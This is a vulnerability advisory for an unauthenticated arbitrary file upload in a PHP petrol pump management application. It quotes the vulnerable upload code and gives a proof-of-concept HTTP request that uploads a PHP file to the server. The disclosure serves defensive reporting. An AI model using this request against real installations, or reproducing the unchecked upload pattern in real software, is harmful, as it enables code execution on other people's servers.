# SOURCECODESTER / Petrol pump management software - Unauthenticated Arbitrary File Upload

## **Credits**
> Joshua Lictan (https://github.com/skid-nochizplz/skid-nochizplz)<br/>

## Vendor Homepage:
> https://www.sourcecodester.com/php/17180/petrol-pump-management-software-free-download.html

## Affected Component
> /admin/app/product.php

## Code
```php
    if (isset($_POST['submit'])) {
        $filepath = "../../assets/images/" . htmlspecialchars($_FILES["photo"]["name"], ENT_QUOTES);
        
        if (move_uploaded_file($_FILES["photo"]["tmp_name"], $filepath)) {
            var_dump('test');
            //echo "<img src=".$filepath." height=200 width=300 />";
            $img = htmlspecialchars($_FILES["photo"]["name"], ENT_QUOTES);
        } else {
            echo "Error !!";
        }

        $filepath = "../../assets/images/" . htmlspecialchars($_FILES["banner"]["name"], ENT_QUOTES);

        if (move_uploaded_file($_FILES["banner"]["tmp_name"], $filepath)) {
            //echo "<img src=".$filepath." height=200 width=300 />";
            $img1 = htmlspecialchars($_FILES["banner"]["name"], ENT_QUOTES);
        } else {
            echo "Error !!";
        }


        $stmt = $conn->prepare("INSERT INTO `product`(`heading`, `shortcontent`, `content`,`photo`, `banner`,`metatitle`,`metadescription`,`keywords`,`robots`) VALUES (?,?,?,?,?,?,?,?,?)");
     // Author Name: Mayuri K. 
// for any PHP, Codeignitor, Laravel OR Python work contact me at mayuri.infospace@gmail.com  
// Visit website : www.mayurik.com
        $stmt->execute([htmlspecialchars($_POST['heading'], ENT_QUOTES), htmlspecialchars($_POST['shortcontent'], ENT_QUOTES), htmlspecialchars($_POST['content'], ENT_QUOTES), $img, $img1, htmlspecialchars($_POST['metatitle'], ENT_QUOTES), htmlspecialchars($_POST['metadescription'], ENT_QUOTES), htmlspecialchars($_POST['keywords'], ENT_QUOTES), htmlspecialchars($_POST['robots'], ENT_QUOTES)]);

     // Author Name: Mayuri K. 
// for any PHP, Codeignitor, Laravel OR Python work contact me at mayuri.infospace@gmail.com  
// Visit website : www.mayurik.com

        $_SESSION['success'] = "success";

        header("location:../manage_profile.php");
    }



    if (isset($_POST['update'])) {

        if ($_FILES['photo']['tmp_name'] != '') {
            $file_extension = pathinfo($_FILES["photo"]["name"], PATHINFO_EXTENSION);
            $new_filename = uniqid() . '.' . $file_extension;
            $filepath = "../../assets/images/" . $new_filename;

            if (move_uploaded_file($_FILES["photo"]["tmp_name"], $filepath)) {
                $img = $new_filename;

                @unlink("../../assets/images/" . htmlspecialchars($_POST['old_photo_img'], ENT_QUOTES));
            }
        } else {
            $img = htmlspecialchars($_POST['old_photo_img'], ENT_QUOTES);
        }

        if ($_FILES['banner']['tmp_name'] != '') {
            $file_extension = pathinfo($_FILES["banner"]["name"], PATHINFO_EXTENSION);
            $new_filename = uniqid() . '.' . $file_extension;
            $filepath = "../../assets/images/" . $new_filename;

            if (move_uploaded_file($_FILES["banner"]["tmp_name"], $filepath)) {
                $img1 = $new_filename;

                @unlink("../../assets/images/" . htmlspecialchars($_POST['old_banner_img'], ENT_QUOTES));
            }
        } else {
            $img1 = htmlspecialchars($_POST['old_banner_img'], ENT_QUOTES);
        }

        $stmt = $conn->prepare("UPDATE `product` SET `heading`=?,`shortcontent`=?,`content`=?,`photo`=?,`banner`=?,`metatitle`=?,`metadescription`=?, `keywords`=?, `robots`=? WHERE id=? ");

        $stmt->execute([htmlspecialchars($_POST['heading'], ENT_QUOTES), htmlspecialchars($_POST['shortcontent'], ENT_QUOTES), htmlspecialchars($_POST['content'], ENT_QUOTES), $img, $img1, htmlspecialchars($_POST['metatitle'], ENT_QUOTES), htmlspecialchars($_POST['metadescription'], ENT_QUOTES), htmlspecialchars($_POST['keywords'], ENT_QUOTES), htmlspecialchars($_POST['robots'], ENT_QUOTES), htmlspecialchars($_POST['id'], ENT_QUOTES)]);
        $_SESSION['update'] = "update";
        header("location:../manage_profile.php");
    }
```

## Proof of Concept
**HTTP Request Example**
``` http request
POST /admin/app/product.php HTTP/1.1
Host: 127.0.0.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarycF8LWYF3XessE4is
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

------WebKitFormBoundarycF8LWYF3XessE4is
Content-Disposition: form-data; name="photo"; filename="nochizplz.php"
Content-Type: application/octet-stream

<?php phpinfo(); ?>

------WebKitFormBoundarycF8LWYF3XessE4is
Content-Disposition: form-data; name="submit"


------WebKitFormBoundarycF8LWYF3XessE4is--
```

## Screenshot
![image](https://github.com/skid-nochizplz/skid-nochizplz/assets/160950031/8c1435f4-7594-410c-a91a-506f299bd47c)
